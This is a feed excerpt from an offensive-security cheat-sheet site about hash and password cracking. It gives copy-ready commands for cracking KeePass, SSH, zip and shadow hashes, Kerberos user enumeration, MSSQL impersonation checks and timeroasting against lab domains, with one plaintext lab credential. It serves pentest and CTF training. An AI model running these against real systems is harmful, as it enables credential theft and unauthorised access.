channel.title: Hash Cracking on TLDRBins
channel.description: Recent content in Hash Cracking on TLDRBins

item.title: Keepass
item.description: Crack Master Password keepass2john <KDBX_FILE> > hash # With a key file keepass2john -k <KEY_FILE> <KDBX_FILE> > hash Basic Windows # Open kdbx kpcli --kdb <KDBX_FILE> # Open kdbx with a key file kpcli --key <KEY_FILE> --kdb <KDBX_FILE> # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli

item.title: Kerberos
item.description: Users Enum kerbrute metasploit kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE> $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 > Using KDC(s): 2024/09/24 14:54:41 > dc.

item.title: MSSQL Privilege Escalation
item.description: Enum Linux Windows 1. List Users that Can be Impersonated nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate $ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_impersonate MSSQL 10.129.254.242 1433 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl) MSSQL 10.129.254.242 1433 DC [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii ENUM_IMP... 10.129.254.242 1433 DC [-] No users with impersonation rights found. 2. Enumerate Active MSSQL Logins nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins $ nxc mssql DC.

item.title: Password Cracking
item.description: Convert File to Hash Format # For example ssh2john id_rsa_encrypted > hash keepass2john test.kdbx > hash zip2john test.zip > hash # Get a full list of *2john find / -name *2john 2>/dev/null john hashcat # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 # Auto detect hash format hashcat hash # Specify hash format hashcat -m <MODE> -a 0 hash /usr/share/wordlists/rockyou.

item.title: Shadow Hash Cracking
item.description: Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt > unshadowed.txt john hashcat john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user

item.title: Time Roasting
item.description: Time Roasting nxc # Anonymous nxc smb <DC> -M timeroast # Password nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M timeroast # Kerberos sudo ntpdate -s <DC_IP> && nxc smb <DC> -u '<USER>' -p '<PASSWORD>' -k -d <DOMAIN> -M timeroast Hash Crack # Modified to Use rockyou.txt python3 timecrack.py <HASH_FILE> /usr/share/wordlists/rockyou.txt #!/usr/bin/env python3 """Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format unfortunately does not fit into Hashcat or John right now.
